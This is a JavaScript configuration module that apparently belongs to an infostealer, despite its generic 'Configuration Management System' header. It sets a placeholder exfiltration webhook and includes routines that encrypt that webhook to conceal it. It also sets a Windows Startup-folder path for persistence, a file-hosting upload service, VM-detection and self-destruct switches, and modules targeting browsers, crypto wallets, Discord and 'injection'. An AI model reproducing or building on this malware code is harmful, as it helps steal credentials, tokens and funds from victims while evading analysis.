/**
 * Configuration Management System
 * Handles all application configuration with environment-based settings
 */

const path = require('path');
const fs = require('fs');
const { encryptionUtils } = require('../core/encryption');

class Config {
    constructor() {
        this.config = {
            // Application settings
            app: {
                name: process.env.APP_NAME || 'client',
                version: process.env.APP_VERSION || '1.0.0',
                environment: process.env.NODE_ENV || 'development'
            },

            // Webhook configuration
            webhook: {
                url: process.env.WEBHOOK_URL || '%WEBHOOK%',
                timeout: parseInt(process.env.WEBHOOK_TIMEOUT) || 30000
            },

            // File paths
            paths: {
                temp:
                    process.env.TEMP_PATH || path.join(process.env.LOCALAPPDATA || '/tmp', 'Temp'),
                startup:
                    process.env.STARTUP_PATH ||
                    path.join(
                        process.env.APPDATA || '/tmp',
                        'Microsoft',
                        'Windows',
                        'Start Menu',
                        'Programs',
                        'Startup'
                    ),
                output: process.env.OUTPUT_PATH || './output'
            },

            // Upload settings
            upload: {
                maxSize: parseInt(process.env.MAX_UPLOAD_SIZE) || 7 * 1024 * 1024, // 7MB
                service: process.env.UPLOAD_SERVICE || 'gofile',
                enabled: process.env.UPLOAD_ENABLED !== 'false'
            },

            // Security settings
            security: {
                enableVmDetection: process.env.ENABLE_VM_DETECTION === 'true',
                enableSelfDestruct: process.env.ENABLE_SELF_DESTRUCT === 'true'
            },

            // Module settings
            modules: {
                enabled: {
                    browsers: process.env.ENABLE_BROWSERS !== 'false',
                    crypto: process.env.ENABLE_CRYPTO !== 'false',
                    files: process.env.ENABLE_FILES !== 'false',
                    discord: process.env.ENABLE_DISCORD !== 'false',
                    system: process.env.ENABLE_SYSTEM !== 'false',
                    injection: process.env.ENABLE_INJECTION !== 'false'
                }
            }
        };
    }

    /**
     * Get configuration value by path with automatic webhook decryption
     * @param {string} path - Dot notation path to config value
     * @param {*} defaultValue - Default value if path not found
     * @returns {*} Configuration value
     */
    get(path, defaultValue = null) {
        const keys = path.split('.');
        let value = this.config;

        for (const key of keys) {
            if (value && typeof value === 'object' && key in value) {
                value = value[key];
            } else {
                return defaultValue;
            }
        }

        // Automatically decrypt webhook URLs when retrieved (if they are encrypted)
        if (path === 'webhook.url' && typeof value === 'string') {
            // Only decrypt if the value appears to be encrypted
            if (encryptionUtils.isEncrypted(value)) {
                return encryptionUtils.decryptWebhook(value);
            }
            // Return as-is if not encrypted (plain text URL)
            return value;
        }

        return value;
    }

    /**
     * Set configuration value by path (without automatic webhook encryption)
     * @param {string} path - Dot notation path to config value
     * @param {*} value - Value to set
     */
    set(path, value) {
        const keys = path.split('.');
        const lastKey = keys.pop();
        let current = this.config;

        for (const key of keys) {
            if (!(key in current) || typeof current[key] !== 'object') {
                current[key] = {};
            }
            current = current[key];
        }

        // Note: Removed automatic encryption for webhook URLs
        // URLs are stored as-is in the configuration
        // Decryption only happens at runtime when accessed via get()
        current[lastKey] = value;
    }

    /**
     * Load configuration from file
     * @param {string} filePath - Path to configuration file
     */
    loadFromFile(filePath) {
        try {
            if (fs.existsSync(filePath)) {
                const fileConfig = JSON.parse(fs.readFileSync(filePath, 'utf8'));
                this.config = { ...this.config, ...fileConfig };

                // Note: Removed automatic encryption of webhook URL in config file
                // The URL will remain in its original format in the config.json file
                // Decryption still happens at runtime when the URL is accessed via get()
            }
        } catch (error) {
            console.warn(`Failed to load config from ${filePath}:`, error.message);
        }
    }

    /**
     * Save configuration to file
     * @param {string} filePath - Path to save configuration
     */
    saveToFile(filePath) {
        try {
            const dir = path.dirname(filePath);
            if (!fs.existsSync(dir)) {
                fs.mkdirSync(dir, { recursive: true });
            }
            fs.writeFileSync(filePath, JSON.stringify(this.config, null, 2));
        } catch (error) {
            console.error(`Failed to save config to ${filePath}:`, error.message);
        }
    }

    /**
     * Validate required configuration
     * @returns {boolean} True if configuration is valid
     */
    validate() {
        const required = ['app.name', 'webhook.url', 'paths.temp'];

        for (const path of required) {
            if (this.get(path) === null) {
                console.error(`Missing required configuration: ${path}`);
                return false;
            }
        }

        return true;
    }

    /**
     * Encrypt webhook URL in configuration if not already encrypted
     * @returns {boolean} True if webhook was encrypted or already encrypted
     */
    encryptWebhookUrl() {
        try {
            const currentUrl = this.config.webhook?.url;
            if (!currentUrl || currentUrl === '%WEBHOOK%') {
                return true; // Nothing to encrypt
            }

            // Encrypt the webhook URL and update configuration
            const encryptedUrl = encryptionUtils.encryptWebhook(currentUrl);
            if (encryptedUrl !== currentUrl) {
                this.config.webhook.url = encryptedUrl;
                console.log('Webhook URL encrypted successfully');
            }

            return true;
        } catch (error) {
            console.error('Failed to encrypt webhook URL:', error.message);
            return false;
        }
    }

    /**
     * Automatically encrypt webhook URL if it's not already encrypted and save to file
     * @param {string} filePath - Path to configuration file to save to
     * @returns {boolean} True if webhook was encrypted or already encrypted
     */
    autoEncryptWebhookUrl(filePath) {
        try {
            const currentUrl = this.config.webhook?.url;
            if (!currentUrl || currentUrl === '%WEBHOOK%') {
                return true; // Nothing to encrypt
            }

            // Check if webhook URL is already encrypted
            if (encryptionUtils.isEncrypted(currentUrl)) {
                return true; // Already encrypted, no action needed
            }

            // Encrypt the webhook URL
            const encryptedUrl = encryptionUtils.encryptWebhook(currentUrl);
            if (encryptedUrl !== currentUrl) {
                this.config.webhook.url = encryptedUrl;

                // Save the updated configuration back to file
                this.saveToFile(filePath);

                console.log('Webhook URL automatically encrypted and saved to configuration');
                return true;
            }

            return true;
        } catch (error) {
            console.error('Failed to automatically encrypt webhook URL:', error.message);
            return false;
        }
    }
}

// Create and export singleton instance
const config = new Config();

// Load configuration from file if exists
config.loadFromFile('./config.json');

module.exports = config;
